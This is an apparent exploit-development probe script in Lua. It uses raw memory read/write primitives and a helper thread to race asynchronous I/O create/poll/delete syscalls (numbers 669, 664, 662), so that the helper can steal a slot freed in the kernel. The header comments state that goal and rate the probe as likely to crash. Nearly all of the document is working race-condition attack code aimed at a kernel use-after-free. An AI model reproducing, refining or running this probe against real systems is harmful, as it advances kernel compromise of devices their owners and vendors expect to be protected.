-- CRASH_CLASS: HIGH
-- PROBE 502d: every parent delete frees a slot the helper can steal
-- The parent creates an id and deletes it in the same iteration, so each delete
-- invalidates and releases one slot immediately before its second lookup. The
-- helper creates continuously, which is the thread that can grab that slot while
-- the parent is between the unlock and the re-read.
print("=== PROBE 502d: aio steal the freed slot ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(a) return string.format("0x%X", a) end
local data = memory.alloc(0x200)
local out  = memory.alloc(0x40)
local res  = memory.alloc(0x80)
local gate = memory.alloc(0x40)
for o = 0, 0x3C, 4 do pcall(function() memory.write_dword(gate + o, 0) end) end
for o = 0, 0x1FC, 4 do pcall(function() memory.write_dword(data + o, 0) end) end
local D, O = hx(to_num(data)), hx(to_num(out))
local R, G = hx(to_num(res)), hx(to_num(gate))

local body = ([[
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local c = make_syscall(669)
local DATA, OUT, GATE = %s, %s, %s
local function rd(a) return to_num(memory.read_dword(a)) end
local function wr(a, v) pcall(function() memory.write_dword(a, v) end) end
while rd(GATE) == 0 do end
local n = 0
for i = 1, 1500 do
  wr(OUT, 0)
  pcall(function() c(1, DATA, 1, 1, OUT) end)
  if rd(OUT) ~= 0 then n = n + 1 end
  if i %% 100 == 0 then wr(GATE + 0x10, n) end
end
wr(GATE + 0x10, n)
wr(GATE + 8, 1)
]]):format(D, O, G)

local thr = run_lua_code_in_new_thread(body, { async = true })
local sc_c, sc_d, sc_p = make_syscall(669), make_syscall(662), make_syscall(664)
local idp = memory.alloc(8)
local okc, okd, zeros, others, failed = 0, 0, 0, 0, 0
for i = 1, 400 do
  pcall(function() memory.write_dword(out, 0) end)
  local c_ok = pcall(function() return sc_c(1, uint64(D), 1, 1, uint64(O)) end)
  local id = to_num(memory.read_dword(out))
  if c_ok and id ~= 0 then
    okc = okc + 1
    pcall(function() memory.write_dword(idp, id) end)
    pcall(function() sc_p(uint64(hx(to_num(idp))), 1, uint64(R)) end)
    local d_ok, d_ret = pcall(function() return sc_d(uint64(hx(to_num(idp))), 1, uint64(R)) end)
    if d_ok then
      okd = okd + 1
      local st = to_num(memory.read_dword(R))
      if st == 0 then zeros = zeros + 1 else others = others + 1 end
    end
  else
    failed = failed + 1
  end
  if i % 100 == 0 then
    print(string.format("i=%d helper=%d create-ok=%d delete-ok=%d zero=%d other=%d fail=%d",
      i, to_num(memory.read_dword(gate + 0x10)), okc, okd, zeros, others, failed))
  end
end
print(string.format("create-ok=%d delete-ok=%d zero=%d other=%d fail=%d", okc, okd, zeros, others, failed))
local spins = 0
while to_num(memory.read_dword(gate + 8)) == 0 and spins < 4000000 do spins = spins + 1 end
print("helper done=" .. tostring(to_num(memory.read_dword(gate + 8))) .. " helper-created=" .. to_num(memory.read_dword(gate + 0x10)))
print("=== PROBE 502d COMPLETE ===")
